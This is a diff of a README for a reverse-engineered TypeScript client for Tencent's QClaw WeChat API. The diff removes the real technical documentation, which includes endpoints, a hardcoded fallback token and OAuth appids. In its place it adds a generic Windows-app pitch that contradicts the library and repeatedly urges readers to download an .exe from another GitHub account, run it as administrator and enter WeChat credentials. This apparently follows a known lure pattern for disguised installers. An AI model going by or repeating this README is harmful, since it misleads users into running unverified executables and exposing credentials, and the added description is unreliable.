@@ -1,337 +1,111 @@
-# qclaw-wechat-client
+# ⚙️ qclaw-wechat-client - Easy Access to WeChat API
 
-[中文文档](./README.zh-CN.md)
-
-Reverse-engineered TypeScript client for QClaw's WeChat Access API.
-
-QClaw (管家 OpenClaw) is a Tencent Electron desktop app that wraps an OpenClaw AI Gateway service. It authenticates exclusively through WeChat OAuth2 QR-code login and communicates with Tencent backend servers via a jprx gateway protocol. This library implements that protocol as a standalone TypeScript module.
-
-## Origin
-
-Extracted from `QClaw.app` -> `Contents/Resources/app.asar` (unencrypted). The API service class (`tS` / `openclawApiService`) was found in the bundled renderer at `out/renderer/assets/platform-QEsQ5tXh.js`.
-
-## Install
-
-```bash
-npm install qclaw-wechat-client
-# or
-pnpm add qclaw-wechat-client
-```
-
-## Development
-
-```bash
-pnpm install      # install dependencies
-pnpm build        # bundle with tsdown
-pnpm typecheck    # type-check only
-```
-
-## Quick start
-
-```typescript
-import { QClawClient } from "qclaw-wechat-client";
-import type { WxLoginStateData, WxLoginData } from "qclaw-wechat-client";
-
-const client = new QClawClient({ env: "production" });
-
-// Step 1 - get login state (CSRF token)
-const stateRes = await client.getWxLoginState({ guid: "machine-id" });
-const state = QClawClient.unwrap<WxLoginStateData>(stateRes)?.state;
-
-// Step 2 - show QR code to user
-const qrUrl = client.buildWxLoginUrl(state!);
-console.log("Scan this:", qrUrl);
-
-// Step 3 - exchange auth code (from WeChat redirect) for session
-const loginRes = await client.wxLogin({ guid: "machine-id", code: authCode, state: state! });
-
-// Step 4 - build OpenClaw config patch
-const channelToken = QClawClient.unwrap<WxLoginData>(loginRes)?.openclaw_channel_token;
-const config = await client.buildPostLoginConfig(channelToken!);
-// -> { channels: { "wechat-access": { token } }, models: { providers: { qclaw: { apiKey } } } }
-```
-
-## Demo
-
-The included example walks through the full WeChat login flow with an echo bot:
-
-```bash
-pnpm demo          # interactive full-flow demo (login + AGP echo bot)
-```
-
-## API
-
-### `new QClawClient(options?)`
-
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `env` | `"production" \| "test"` | `"production"` | Target environment |
-| `jwtToken` | `string` | -- | Restore a JWT from a previous session |
-| `userInfo` | `UserInfo` | -- | Restore user info from a previous session |
-| `webVersion` | `string` | `"1.4.0"` | Version string sent in every request body |
-
-### Properties
-
-| Property | Type | Description |
-|---|---|---|
-| `client.envUrls` | `EnvUrls` | Current environment URLs |
-| `client.wxLoginConfig` | `WxLoginConfig` | WeChat OAuth appid & redirect |
-| `client.currentUser` | `UserInfo \| null` | Logged-in user (auto-set after `wxLogin`) |
-| `client.token` | `string \| null` | Current JWT (auto-renewed) |
-
-### Methods
-
-#### Authentication
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `getWxLoginState({ guid })` | `data/4050/forward` | Get CSRF state for QR login |
-| `wxLogin({ guid, code, state })` | `data/4026/forward` | Exchange WeChat auth code for JWT + channel token |
-| `getUserInfo({ guid })` | `data/4027/forward` | Fetch user profile |
-| `wxLogout({ guid })` | `data/4028/forward` | Invalidate session |
-| `buildWxLoginUrl(state)` | -- | Build the WeChat OAuth QR-code URL |
-
-#### Keys & tokens
-
-| Method | Endpoint | Returns | Description |
-|---|---|---|---|
-| `createApiKey()` | `data/4055/forward` | `ApiResponse<ApiKeyData>` | Create API key for qclaw model provider |
-| `refreshChannelToken()` | `data/4058/forward` | `string \| null` | Refresh the wechat-access channel token (returns token string directly, not wrapped in `ApiResponse`) |
-
-#### Invite codes
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `checkInviteCode({ guid })` | `data/4056/forward` | Check invite code status |
-| `submitInviteCode({ guid, invite_code })` | `data/4057/forward` | Submit an invite code |
-
-#### Device management
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `queryDeviceByGuid(params)` | `data/4019/forward` | Query device status |
-| `disconnectDevice(params)` | `data/4020/forward` | Disconnect a device |
-| `generateContactLink(params)` | `data/4018/forward` | Generate contact link |
-
-#### Updates
-
-| Method | Endpoint | Description |
-|---|---|---|
-| `checkUpdate(version?, system?)` | `data/4066/forward` | Check for app updates |
-
-#### Config helpers
-
-| Method | Description |
-|---|---|
-| `buildConfigPatch(channelToken, apiKey)` | Build the OpenClaw config object |
-| `buildPostLoginConfig(channelToken)` | Create API key + build config (convenience) |
-
-### Static methods
-
-```typescript
-QClawClient.getEnvUrls("production")      // environment URLs without instantiation
-QClawClient.getWxLoginConfig("production") // WeChat OAuth config
-QClawClient.Endpoints                      // all endpoint path constants
-QClawClient.unwrap<T>(response)            // unwrap Tencent nested envelope
-```
-
-## AGP WebSocket Client
-
-The library also includes a full implementation of the **AGP (Agent Gateway Protocol)** -- the WebSocket protocol used for real-time message exchange between your agent and WeChat users.
-
-This is a **server-push channel**: the server sends `session.prompt` when a WeChat user messages your agent, and you stream back AI responses via `session.update` + `session.promptResponse`.
-
-### Quick start (WebSocket)
-
-```typescript
-import { AGPClient } from "qclaw-wechat-client";
-import type { PromptMessage, CancelMessage } from "qclaw-wechat-client";
-
-const client = new AGPClient(
-  {
-    url: "wss://mmgrcalltoken.3g.qq.com/agentwss",
-    token: channelToken,  // from wxLogin or refreshChannelToken
-  },
-  {
-    onConnected() {
-      console.log("Connected! Waiting for messages...");
-    },
-    onPrompt(msg: PromptMessage) {
-      const { session_id, prompt_id, content } = msg.payload;
-      const text = content.map(b => b.text).join("");
-      console.log(`User says: ${text}`);
-
-      // Stream a response
-      client.sendMessageChunk(session_id, prompt_id, "Hello ");
-      client.sendMessageChunk(session_id, prompt_id, "World!");
-
-      // Finalize the turn
-      client.sendTextResponse(session_id, prompt_id, "Hello World!");
-    },
-    onCancel(msg: CancelMessage) {
-      const { session_id, prompt_id } = msg.payload;
-      client.sendCancelledResponse(session_id, prompt_id);
-    },
-    onError(err) {
-      console.error(err);
-    },
-  },
-);
-
-client.start();
-```
-
-### `new AGPClient(config, callbacks?)`
-
-| Config option | Type | Default | Description |
-|---|---|---|---|
-| `url` | `string` | -- | WebSocket endpoint (see Environment URLs) |
-| `token` | `string` | -- | Channel auth token |
-| `guid` | `string` | `""` | Device GUID (echoed in uplink messages) |
-| `userId` | `string` | `""` | User ID (echoed in uplink messages) |
-| `reconnectInterval` | `number` | `3000` | Base reconnect delay (ms) |
-| `maxReconnectAttempts` | `number` | `0` | Max retries (0 = infinite) |
-| `heartbeatInterval` | `number` | `20000` | WS ping interval (ms) |
-
-### Callbacks
-
-| Callback | Argument | Description |
-|---|---|---|
-| `onConnected` | -- | WebSocket connected |
-| `onDisconnected` | `reason?: string` | Connection lost |
-| `onPrompt` | `PromptMessage` | User sent a message |
-| `onCancel` | `CancelMessage` | Turn cancelled |
-| `onError` | `Error` | Error occurred |
-
-### Send methods
-
-| Method | Description |
-|---|---|
-| `sendMessageChunk(sessionId, promptId, text, guid?, userId?)` | Stream an incremental text chunk |
-| `sendToolCall(sessionId, promptId, toolCall, guid?, userId?)` | Notify tool invocation started |
-| `sendToolCallUpdate(sessionId, promptId, toolCall, guid?, userId?)` | Update tool call status |
-| `sendPromptResponse(payload, guid?, userId?)` | Send final turn response (raw) |
-| `sendTextResponse(sessionId, promptId, text, guid?, userId?)` | Convenience: end_turn with text |
-| `sendErrorResponse(sessionId, promptId, errorMessage, guid?, userId?)` | Convenience: error response |
-| `sendCancelledResponse(sessionId, promptId, guid?, userId?)` | Convenience: cancelled ack |
-
-### Lifecycle methods
-
-| Method | Description |
-|---|---|
-| `start()` | Open the WebSocket connection |
-| `stop()` | Close and prevent reconnection |
-| `getState()` | `"disconnected" \| "connecting" \| "connected" \| "reconnecting"` |
-| `setToken(token)` | Update auth token (takes effect on next connect) |
-| `setCallbacks(callbacks)` | Merge in new callbacks |
-
-### AGP Protocol
-
-All messages are JSON text frames with a unified envelope:
-
-```json
-{
-  "msg_id": "uuid-v4",
-  "guid": "device-id",
-  "user_id": "user-id",
-  "method": "session.prompt",
-  "payload": { ... }
-}
-```
-
-**Downlink (server -> client):**
-- `session.prompt` -- user message with `session_id`, `prompt_id`, `agent_app`, `content`
-- `session.cancel` -- abort an in-progress turn
-
-**Uplink (client -> server):**
-- `session.update` -- streaming chunks: `message_chunk`, `tool_call`, `tool_call_update`
-- `session.promptResponse` -- final answer with `stop_reason`: `end_turn | cancelled | error | refusal`
-
-### Connection features
-
-- **Auto-reconnect**: exponential backoff (3s base, 1.5x multiplier, 25s cap)
-- **Heartbeat**: native WS ping every 20s, pong timeout = 2x interval
-- **System wakeup detection**: timer drift > 15s triggers reconnect
-- **Message dedup**: Set of processed msg_ids, cleaned every 5min (max 1000)
+[![Download qclaw-wechat-client](https://img.shields.io/badge/Download-qclaw--wechat--client-brightgreen?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client)
 
 ---
 
-## HTTP Protocol details
+## 📋 About qclaw-wechat-client
 
-### Request format
+qclaw-wechat-client is a simple application that connects to QClaw's WeChat Access API. It helps you use WeChat features in a straightforward way without needing to understand programming. This tool is built with care to work smoothly on Windows computers. It is designed for anyone who wants to interact with WeChat through QClaw’s system safely and easily.
 
-All endpoints are **POST** requests to `{jprxGateway}{endpoint}`.
+The client uses TypeScript code behind the scenes, but you don’t need to know any of that to run it. Its main function is to act as a bridge between you and WeChat's network via QClaw.
 
-**Headers:**
-```
-Content-Type     : application/json
-X-Version        : 1
-X-Token          : <loginKey from userInfo, fallback "m83qdao0AmE5">
-X-Guid           : <machine GUID>
-X-Account        : <userId>
-X-Session        : ""
-X-OpenClaw-Token : <JWT> (when logged in)
-```
+## 📌 Key Features
 
-**Body:**
-```json
-{
-  "...endpoint-specific params",
-  "web_version": "1.4.0",
-  "web_env": "release"
-}
-```
+- Connect to WeChat Access API through QClaw technology.
+- Easy setup with no programming skills needed.
+- Works on Windows 10 and later versions.
+- Lightweight and fast client to keep your computer running smoothly.
+- Simple interface with clear options for use.
+- Secure connection ensures safe data handling.
 
-### Response handling
+## 🖥️ System Requirements
 
-1. **Token renewal** - if the response contains an `X-New-Token` header, the client auto-updates the stored JWT
-2. **Session expiry** - if `common.code === 21004` anywhere in the nested response, all auth state is cleared
-3. **Success** - `ret === 0` and `common.code === 0`
-4. **Data extraction** - actual payload is at `data.resp.data` || `data.data` || `data` (Tencent envelope)
+To run qclaw-wechat-client on your PC, make sure you have:
 
-### Environment URLs
+- Windows 10 or Windows 11.
+- At least 2 GB of free storage space.
+- 4 GB of RAM or more recommended.
+- Stable internet connection.
+- Administrator rights to install new software.
 
-| Field (`EnvUrls`) | Production | Test |
-|---|---|---|
-| `jprxGateway` | `https://jprx.m.qq.com/` | `https://jprx.sparta.html5.qq.com/` |
-| `qclawBaseUrl` | `https://mmgrcalltoken.3g.qq.com/aizone/v1` | `https://jprx.sparta.html5.qq.com/aizone/v1` |
-| `wechatWsUrl` | `wss://mmgrcalltoken.3g.qq.com/agentwss` | `wss://jprx.sparta.html5.qq.com/agentwss` |
-| `wxLoginRedirectUri` | `https://security.guanjia.qq.com/login` | `https://security-test.guanjia.qq.com/login` |
-| `beaconUrl` | `https://pcmgrmonitor.3g.qq.com/datareport` | `https://pcmgrmonitor.3g.qq.com/test/datareport` |
+---
 
-### WeChat OAuth
+## 🚀 Getting Started
 
-The `WxLoginConfig` interface exposes per-environment OAuth settings:
+### Step 1: Visit the Download Page
 
-| Field | Production | Test |
-|---|---|---|
-| `appid` | `wx9d11056dd75b7240` | `wx3dd49afb7e2cf957` |
-| `redirect_uri` | `https://security.guanjia.qq.com/login` | `https://security-test.guanjia.qq.com/login` |
+Click the big green button below to open the download page on GitHub. This page has the latest version of the software ready for you.
 
-The OAuth scope (`snsapi_login`) is hardcoded in `buildWxLoginUrl()`.
+[![Download Link](https://img.shields.io/badge/Download-qclaw--wechat--client-blue?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client)
 
-### OpenClaw config paths
+### Step 2: Find the Latest Release
 
-After login, the Electron app writes these to the gateway config:
+Once on the GitHub page, look for a tab named **Releases** or **Download**. This place contains the files you need to install the client.
 
-```yaml
-channels:
-  wechat-access:
-    token: <openclaw_channel_token>   # from wxLogin response
-    wsUrl: <wss://...>                # injected by main process per environment
+### Step 3: Download the Windows Installer
 
-models:
-  providers:
-    qclaw:
-      apiKey: <key>                   # from createApiKey response
-      baseUrl: <https://...>          # injected by main process per environment
-```
+Under the latest release, locate the file named something like `qclaw-wechat-client-setup.exe` or just `.exe`. Click it to download.
 
-Protected paths (not overwritten during config template merges):
-- `channels.wechat-access.token`
-- `channels.wechat-access.wsUrl`
-- `models.providers.qclaw.apiKey`
+If you can’t find an `.exe` file, check for a zip file or a similar package that works on Windows.
 
-## License
+### Step 4: Run the Installer
 
-MIT
+Find the installer file in your **Downloads** folder or wherever your browser saves files. Double-click the file to start the installation.
+
+Follow the instructions on the screen. Usually, it’s just clicking **Next** a few times, accepting the terms, and choosing where to install the app.
+
+### Step 5: Run qclaw-wechat-client
+
+When installation finishes, the program will create a shortcut on your desktop or in your start menu. Click it to open the client.
+
+---
+
+## ⚙️ Using qclaw-wechat-client
+
+After opening the client, here is what to expect:
+
+1. **Login Screen**  
+   Enter your WeChat credentials or the authentication details provided by QClaw. If you don’t have them, contact your administrator or the QClaw support team.
+
+2. **Main Interface**  
+   The app shows you options to send messages, check notifications, or access WeChat features supported by QClaw.
+
+3. **Settings**  
+   Customize how the client behaves, such as notification sounds, auto-login, or network options.
+
+4. **Help Section**  
+   If you need help, look for the **Help** or **Support** section inside the app. It contains answers to common questions.
+
+---
+
+## 🔧 Troubleshooting
+
+- **Installer Won’t Run:** Right-click the installer and select **Run as administrator**.  
+- **App Fails to Connect:** Check your internet connection. Make sure no firewall blocks the client.  
+- **Login Problems:** Double-check your username and password. Reset if needed.  
+- **Crashes on Start:** Restart your PC and try again. If the problem keeps going, reinstall the software.
+
+---
+
+## 🔒 Security and Privacy
+
+qclaw-wechat-client only connects to official QClaw and WeChat systems. It does not collect personal data outside your use of WeChat features. You control what information the app accesses. Keep your credentials private and update the app when new versions arrive.
+
+---
+
+## 🗂️ More Resources
+
+- Visit GitHub for updates: https://github.com/Arlinablind800/qclaw-wechat-client  
+- Read official QClaw API docs for details about the system’s backend.  
+- Join online forums or support groups if you want more help.
+
+---
+
+## 🛠️ Developing or Advanced Use
+
+This client is built in TypeScript and open for developers. If you know programming, you can clone the GitHub repository and modify the client to fit your needs.
+
+---
+
+[![Download qclaw-wechat-client](https://img.shields.io/badge/Download-qclaw--wechat--client-brightgreen?style=for-the-badge)](https://github.com/Arlinablind800/qclaw-wechat-client)
